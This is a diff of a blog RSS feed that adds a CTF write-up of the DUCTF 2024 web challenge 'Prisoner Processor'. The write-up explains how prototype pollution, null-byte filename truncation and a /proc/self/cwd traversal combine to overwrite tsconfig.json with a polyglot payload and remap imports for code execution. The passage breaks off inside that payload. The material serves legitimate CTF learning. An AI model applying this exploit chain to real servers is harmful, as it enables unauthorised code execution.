@@ -6,8 +6,297 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>CC Attribution-NonCommercial 4.0 International License</copyright>
-        <lastBuildDate>Sat, 06 Jan 2024 22:23:05 -0500</lastBuildDate>
+        <lastBuildDate>Sun, 07 Jul 2024 10:29:46 -0400</lastBuildDate>
         <atom:link href="https://jamvie.net/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>DUCTF 2024: Prisoner Processor</title>
+            <link>https://jamvie.net/posts/2024/07/ductf-2024-prisoner-processor/</link>
+            <pubDate>Sun, 07 Jul 2024 10:29:46 -0400</pubDate>
+            
+            <guid>https://jamvie.net/posts/2024/07/ductf-2024-prisoner-processor/</guid>
+            <description>DUCTF 2024 has concluded this summer, and I decided to take a look at it with Maple Bacon and solve a few challenges. This is specifically a writeup for &amp;ldquo;Prisoner-Processor&amp;rdquo;, the hardest web challenge available. My teammate Angus and I solved this together.
+SPECS start.sh The start.sh script is more sus than other conventional start.sh scripts as it will attempt to restart the server 5 times, then copy a backup to the app folder if it couldn&amp;rsquo;t restart, and retry again in a perpetual loop.</description>
+            <content type="html"><![CDATA[<p>DUCTF 2024 has concluded this summer, and I decided to take a look at it with Maple Bacon and solve a few challenges. This is specifically a writeup for &ldquo;Prisoner-Processor&rdquo;, the hardest web challenge available. My teammate Angus and I solved this together.</p>
+<h2 id="specs">SPECS</h2>
+<h3 id="startsh">start.sh</h3>
+<p>The start.sh script is more sus than other conventional start.sh scripts as it will attempt to restart the server 5 times, then copy a backup to the app folder if it couldn&rsquo;t restart, and retry again in a perpetual loop.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>cd /app;
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Loop in case the app crashes for some reason ¯\_(ツ)_/¯</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> :; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i in <span style="color:#66d9ef">$(</span>seq <span style="color:#ae81ff">1</span> 5<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>        bun run start;
+</span></span><span style="display:flex;"><span>        sleep 1;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Okay for some reason something really goofed up...</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Restoring from backup</span>
+</span></span><span style="display:flex;"><span>    cp -r /home/bun/backup/app/* /app;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><p>It&rsquo;s technically not <em>wrong</em> to have a start.sh auto-restart a server if it goes down, but there&rsquo;s a few ways to do that that&rsquo;s considered &ldquo;cleaner&rdquo;. On the infrastructural side, enabling <code>restart: always</code> in the docker-compose.yml file does the same thing, with the added benefit of restarting the whole container, on a clean serving of the app data (no need to copy a backup). Basically, having the app do the restarts in the challenge itself seems weird. This is important for later.</p>
+<h3 id="indexts">index.ts</h3>
+<p>Some ground truths about the challenge:</p>
+<ul>
+<li>It runs on TypeScript, and the runtime is <a href="https://bun.sh/">Bun</a></li>
+<li>It&rsquo;s a prisoner?? database with an &ldquo;examples&rdquo; endpoint that gives you a JSON of all of Oceania&rsquo;s prisoners and their crimes. Each prisoner JSON has properties that are prefixed with <code>signed.</code>, and these signed properties are used for signature generation.</li>
+<li>The app can accept submitted JSON, validate its signature, then use <code>stringify</code> from a yaml module to convert into yaml. The JSON-to-YAML is yeeted into a new file, and the app checks for the existence of an <code>outputPrefix</code> in the JSON data. If it exists, it&rsquo;s put into the filename as <code>outputPrefix-&lt;random sequence of chars&gt;.yaml</code> and saved into a folder called <code>/app-data/</code>. That file will not be used anywhere else in the app after it&rsquo;s created.</li>
+</ul>
+<h2 id="exploits">Exploits</h2>
+<h3 id="bypassing-signature-validation-with-top-level-prototype-pollution">Bypassing Signature Validation with Top-level Prototype Pollution</h3>
+<p>In <code>/src/index.ts</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ts" data-lang="ts"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">SIGNED_PREFIX</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`signed.`</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">getSignature</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">data</span>: <span style="color:#66d9ef">any</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">string</span> <span style="color:#f92672">=&gt;</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">toSignArray</span> <span style="color:#f92672">=</span> Object.<span style="color:#a6e22e">entries</span>(<span style="color:#a6e22e">data</span>).<span style="color:#a6e22e">map</span>(([<span style="color:#a6e22e">k</span>, <span style="color:#a6e22e">v</span>]) <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">k</span><span style="color:#e6db74">}</span><span style="color:#e6db74">=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">v</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">toSignArray</span>.<span style="color:#a6e22e">sort</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">s</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">createHmac</span>(<span style="color:#e6db74">&#39;sha256&#39;</span>, <span style="color:#a6e22e">SECRET_KEY</span>)
+</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">toSignArray</span>.<span style="color:#a6e22e">join</span>(<span style="color:#e6db74">&#34;&amp;&#34;</span>))
+</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">digest</span>(<span style="color:#e6db74">&#34;hex&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">s</span>;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">hasValidSignature</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">data</span>: <span style="color:#66d9ef">any</span>, <span style="color:#a6e22e">signature</span>: <span style="color:#66d9ef">string</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">boolean</span> <span style="color:#f92672">=&gt;</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">signedInput</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">getSignature</span>(<span style="color:#a6e22e">data</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">signedInput</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">signature</span>
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">getSignedData</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">data</span>: <span style="color:#66d9ef">any</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">any</span> <span style="color:#f92672">=&gt;</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">signedParams</span>: <span style="color:#66d9ef">any</span> <span style="color:#f92672">=</span> {};
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">param</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">data</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">param</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#a6e22e">SIGNED_PREFIX</span>)) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">keyName</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">param</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#a6e22e">SIGNED_PREFIX</span>.<span style="color:#a6e22e">length</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">signedParams</span>[<span style="color:#a6e22e">keyName</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>[<span style="color:#a6e22e">param</span>];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">signedParams</span>;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>The above functions are responsible for the signature checking. The signature is used to stop us from creating our own JSON objects. The signature is computed with a secure I&rsquo;m-not-gonna-try-to-bruteforce method and is based on all properties in the JSON whose key value starts with <code>signed.</code>. If we modify the signed properties in any way, the signatures won&rsquo;t match and the app will reject our JSON. However, the functions don&rsquo;t check // don&rsquo;t care for properties in the JSON whose key value <em>don&rsquo;t</em> start with <code>signed.</code>, so we can freely add arbitrary properties as long as their key doesn&rsquo;t start with <code>signed.</code>, and those additional properties won&rsquo;t affect the signature. We still wouldn&rsquo;t be able to make a JSON from scratch due to the I&rsquo;m-not-gonna-try-to-bruteforce method to make a new signature, but we can copy one from the &ldquo;examples&rdquo; endpoint and reuse its signature.</p>
+<p>An example JSON file looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JSON" data-lang="JSON"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;signed.name&#34;</span>: <span style="color:#e6db74">&#34;jeff&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;signed.animalType&#34;</span>: <span style="color:#e6db74">&#34;emu&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;signed.age&#34;</span>: <span style="color:#ae81ff">12</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;signed.crime&#34;</span>: <span style="color:#e6db74">&#34;assault&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;signed.description&#34;</span>: <span style="color:#e6db74">&#34;clotheslined someone with their neck&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;signed.start&#34;</span>: <span style="color:#e6db74">&#34;2024-03-02T10:45:01Z&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;signed.release&#34;</span>: <span style="color:#e6db74">&#34;2054-03-02T10:45:01Z&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The function <code>getSignedData</code> will be given JSON like this and look for any keys using <code>Object.entries</code> that start with <code>signed.</code>, and assign it to an empty object. That object, after having been given all the <code>signed.</code> properties, is then returned.</p>
+<p>The assigning is vulnerable to top-level prototype pollution:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ts" data-lang="ts"><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">param</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#a6e22e">SIGNED_PREFIX</span>)) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">keyName</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">param</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#a6e22e">SIGNED_PREFIX</span>.<span style="color:#a6e22e">length</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">signedParams</span>[<span style="color:#a6e22e">keyName</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>[<span style="color:#a6e22e">param</span>];
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p><code>signedParams[keyName] = data[param];</code> allows you to assign arbitrary properties but only one-layer down. This is not a recursive assignment, so you can&rsquo;t give whole objects to the data. So we can define a <code>signed.__proto__</code> as a key and add additional properties in there - and because <code>Object.entries()</code> doesn&rsquo;t go up the prototype chain during the signature check - but the <code>for (const param in data)</code> loop to assign props DOES go up the prototype chain, it will be added to the object but it won&rsquo;t violate the signature check. This function is used later on in this snippet of code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ts" data-lang="ts"><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">body</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">valid</span>(<span style="color:#e6db74">&#39;json&#39;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">data</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">signedData</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">getSignedData</span>(<span style="color:#a6e22e">data</span>)
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">signature</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">signature</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">hasValidSignature</span>(<span style="color:#a6e22e">signedData</span>, <span style="color:#a6e22e">signature</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;signatures do no match!&#34;</span> }, <span style="color:#ae81ff">400</span>);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">outputPrefix</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">z</span>.<span style="color:#66d9ef">string</span>().<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">signedData</span>.<span style="color:#a6e22e">outputPrefix</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#34;prisoner&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">outputFile</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">outputPrefix</span><span style="color:#e6db74">}</span><span style="color:#e6db74">-</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">randomBytes</span>(<span style="color:#ae81ff">8</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#34;hex&#34;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">.yaml`</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">convertJsonToYaml</span>(<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">outputFile</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">msg</span>: <span style="color:#66d9ef">outputFile</span> });
+</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;failed to convert JSON&#34;</span> }, <span style="color:#ae81ff">500</span>);
+</span></span><span style="display:flex;"><span>      }
+</span></span></code></pre></div><p>As in, the data is stored in the variable <code>signedData</code>. Because the pollution is shallow, we will need to look for properties that the code is checking in the object itself for, AKA, is <code>signedData</code> expected to have any other properties that were not previously defined? The answer is yes: <code>const outputPrefix = z.string().parse(signedData.outputPrefix ?? &quot;prisoner&quot;)</code>. <code>outputPrefix</code> will be &ldquo;prisoner&rdquo; if it wasn&rsquo;t defined, otherwise we have full control over that value if we do define it. This is useful for us because <code>outputPrefix</code> is next used to create the filename in <code>outputFile</code>, which is created as a template string with <code>outputPrefix</code> prepended to the rest of the filename. We have, ostensibly, semi-control over the filename. We can certainly LFI and traverse the directories by making <code>outputPrefix</code> a bunch of <code>../</code> characters, but before we get into how we&rsquo;re gonna use it, we gotta review the other bugs first.</p>
+<h3 id="nullbytes">Nullbytes</h3>
+<p>The function <code>convertJsonToYaml</code> is defined here. Remember that the app doesn&rsquo;t actually use the yaml file anywhere, it&rsquo;s just stored somewhere.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ts" data-lang="ts"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">convertJsonToYaml</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">data</span>: <span style="color:#66d9ef">any</span>, <span style="color:#a6e22e">outputFileString</span>: <span style="color:#66d9ef">string</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">boolean</span> <span style="color:#f92672">=&gt;</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkIfContainsBannedString</span>(<span style="color:#a6e22e">outputFileString</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">filePath</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">OUTPUT_YAML_FOLDER</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">outputFileString</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">outputFile</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Bun</span>.<span style="color:#a6e22e">file</span>(<span style="color:#a6e22e">filePath</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Prevent accidental overwriting of app files
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">existsSync</span>(<span style="color:#a6e22e">outputFile</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">yamlData</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">data</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Bun</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">outputFile</span>, <span style="color:#a6e22e">yamlData</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">error</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>Tracing the logic from above, the arg <code>outputFileString</code> will be the <code>outputFile</code> that we can control the prefix of. First, it&rsquo;s checked to see if we don&rsquo;t have any banned words:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ts" data-lang="ts"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">BANNED_STRINGS</span> <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;app&#34;</span>, <span style="color:#e6db74">&#34;src&#34;</span>, <span style="color:#e6db74">&#34;.ts&#34;</span>, <span style="color:#e6db74">&#34;node&#34;</span>, <span style="color:#e6db74">&#34;package&#34;</span>, <span style="color:#e6db74">&#34;bun&#34;</span>, <span style="color:#e6db74">&#34;home&#34;</span>, <span style="color:#e6db74">&#34;etc&#34;</span>, <span style="color:#e6db74">&#34;usr&#34;</span>, <span style="color:#e6db74">&#34;opt&#34;</span>, <span style="color:#e6db74">&#34;tmp&#34;</span>, <span style="color:#e6db74">&#34;index&#34;</span>, <span style="color:#e6db74">&#34;.sh&#34;</span>
+</span></span><span style="display:flex;"><span>];
+</span></span></code></pre></div><p>Then, Bun runtime will create a &ldquo;file&rdquo; object to perform file I/O stuff on, and the app checks if the file object points to something that already exists. This barricades us from doing too much directory traversal with <code>outputPrefix</code>, because we can&rsquo;t use any words in <code>BANNED_STRINGS</code> and we also can&rsquo;t overwrite some other file. I also didn&rsquo;t really touch on the fact that the file has a bunch of random characters appended to it, and finally, the filetype <code>.yaml</code> added as well, so we can only ever define yaml files, anyway. This situation seems like a good case for null-byte termination.
+Luckily for us, <code>Bun.file()</code> will seemingly(?) not notice the nullbyte, so something like <code>viewie.txt\00&lt;randomcharacters&gt;.yaml</code> will <em>look like</em>  <code>viewie.txt\00&lt;randomcharacters&gt;.yaml</code>. But when <code>Bun.write()</code> is called, something like <code>viewie.txt\00&lt;randomcharacters&gt;.yaml</code> is instead seen as <code>viewie.txt</code> as the write operation implicitly terminates at the null byte. I may be wrong on who&rsquo;s recognizing the nullbyte, but the point is, we can inject a nullbyte into our <code>outputPrefix</code> to remove the <code>&lt;randomcharacters&gt;.yaml</code> suffix to the filename, <em>AND</em> bypass the <code>existsSync</code> check so we can overwrite important files, and they can be of any extension (not just yaml).</p>
+<p>So what about the <code>BANNED_STRINGS</code> list?</p>
+<h3 id="unfortunately-tsconfigjson-isnt-real-json">&ldquo;Unfortunately, tsconfig.json isn&rsquo;t real JSON&rdquo;</h3>
+<p>So, to recap:</p>
+<ol>
+<li>We can add arbitrary properties to a JSON and include a <code>__proto__</code> key which contains <code>outputPrefix</code>.</li>
+<li>You can make <code>outputPrefix</code> navigate to any file and overwrite it, and you just need to add a null byte to cancel out the random garbage appended to it.</li>
+</ol>
+<p>So we have the ability to write to any writable directory in the app. The final few caveats are the fact that while we control the filename and write to anywhere, remember the contents are JSON that has been YAML-ified. So even if we rename our file to <code>somethingelse.js</code>, the file contents will still be a YAML file of prisoner data, NOT js.</p>
+<p>Looking at the <code>BANNED_WORDS</code> list and cross-referencing with the directory structure of the challenge, we can&rsquo;t really go anywhere except for the files in green.</p>
+
+    <img src="/images/DUCTF24_directory.png"  alt="Directory"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Actually just kidding, all those files are in <code>/app</code>, which is part of the <code>BANNED_WORDS</code> list. Shame.</p>
+<p>Good thing that <code>proc/self/cwd</code> is a symlink to <code>/app</code>.</p>
+
+    <img src="/images/DUCTF24_procselfcwd.png"  alt="tsconfig.json isn&#39;t real json"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Minor tangent aside, the only remotely interesting file in there to use, is <code>tsconfig.json</code>. Right now, it doesn&rsquo;t have much to it. But when looking through the documentation for it, we came across an interesting property, <a href="https://bun.sh/docs/runtime/modules#path-re-mapping">path re-mapping</a>:</p>
+<blockquote>
+<p>the Bun runtime will re-map import paths according to the compilerOptions.paths field in tsconfig.json.</p>
+</blockquote>
+<p>More specifically, according to the official TypeScript <a href="https://www.typescriptlang.org/tsconfig/#paths">documentation</a>:</p>
+<blockquote>
+<p>A series of entries which re-map imports to lookup locations relative to the baseUrl if set, or to the tsconfig file itself otherwise. There is a larger coverage of paths in the moduleResolution reference page.
+paths lets you declare how TypeScript should resolve an import in your require/imports.</p>
+</blockquote>
+<p>Any <code>require</code> or <code>import</code> in your typescript will be affected by this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#75715e">//example tsconfig.json
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;compilerOptions&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;paths&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;jquery&#34;</span>: [<span style="color:#e6db74">&#34;./vendor/jquery/dist/jquery&#34;</span>]
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Then, <code>import 'jquery'</code> in your TS file will make the runtime look for the <code>jquery</code> module in <code>./vendor/jquery/dist/jquery</code>. We can freely overwrite this file and have it applied when the <em>app crashes</em>. Remember the start.sh script? It will attempt to restart the app if it detects a crash, and when Bun restarts, it will look for a <code>tsconfig.json</code> to apply. If we modify the <code>tsconfig.json</code> to include this property, we can basically tell Bun what code to run for certain imports, allowing us arbitrary code exec this way.</p>
+<p>If we were to use path re-mapping, what would be a good candidate to re-map? Our first answer to this was the <code>yaml</code> library, as while it&rsquo;s used in the app to YAML-ify the JSON data, ther are no other use cases in the app for YAML to be parsed, loaded, etc etc. So, the re-mapping candidate for us will be <code>yaml</code>. When Bun comes across the <code>import { stringify } from 'yaml';</code> line in index.ts, the <code>tsconfig.json</code> will tell Bun to look to where we tell it to go instead.</p>
+<p>So, gathering all our bugs, if we can make the filename <code>tsconfig.json\00&lt;randomcharacters&gt;.yaml</code>, it will resolve to and overwrite <code>tsconfig.json</code>. Wait, our file is still YAML. So when Bun attempts to read the JSON, it will error out! <code>tsconfig.json</code> needs to be valid JSON after all, right?</p>
+<p><a href="https://github.com/oven-sh/bun/blob/bbc621adff90d8786f2dab4415ba0d2bf97a5006/src/resolver/tsconfig_json.zig#L109">Right?</a></p>
+
+    <img src="/images/DUCTF24_validjson.png"  alt="tsconfig.json isn&#39;t real json"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>I&rsquo;ll spare the details of how we tried to find all the weird and interesting properties that <code>tsconfig.json</code> will allow for, and how the compiler will parse it.</p>
+<p>Here are some things that make it different from regular JSON:</p>
+<ol>
+<li>It can support comment syntax like <code>/**/</code> which technically shouldn&rsquo;t be allowed in JSON formats.</li>
+<li>It allows <code>//</code> to be used as a key. I think??</li>
+<li>You can give it a valid JSON structure, then invalid JSON, and the compiler won&rsquo;t complain.</li>
+</ol>
+<p>Anyway, the following &ldquo;JSON&rdquo; is a valid, readable and parsable <code>tsconfig.json</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#75715e">//: |-
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  {<span style="color:#f92672">&#34;compilerOptions&#34;</span>:{<span style="color:#f92672">&#34;paths&#34;</span>:{<span style="color:#f92672">&#34;yaml&#34;</span>:[<span style="color:#e6db74">&#34;./examples/jeff.json&#34;</span>]}}}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">signed.name:</span> <span style="color:#960050;background-color:#1e0010">jeff</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">signed.animalType:</span> <span style="color:#960050;background-color:#1e0010">emu</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">signed.age:</span> <span style="color:#ae81ff">12</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">signed.crime:</span> <span style="color:#960050;background-color:#1e0010">assault</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">signed.description:</span> <span style="color:#960050;background-color:#1e0010">clotheslined</span> <span style="color:#960050;background-color:#1e0010">someone</span> <span style="color:#960050;background-color:#1e0010">with</span> <span style="color:#960050;background-color:#1e0010">their</span> <span style="color:#960050;background-color:#1e0010">neck</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">signed.start:</span> <span style="color:#ae81ff">2024-03-02</span><span style="color:#960050;background-color:#1e0010">T</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">45</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">01</span><span style="color:#960050;background-color:#1e0010">Z</span>
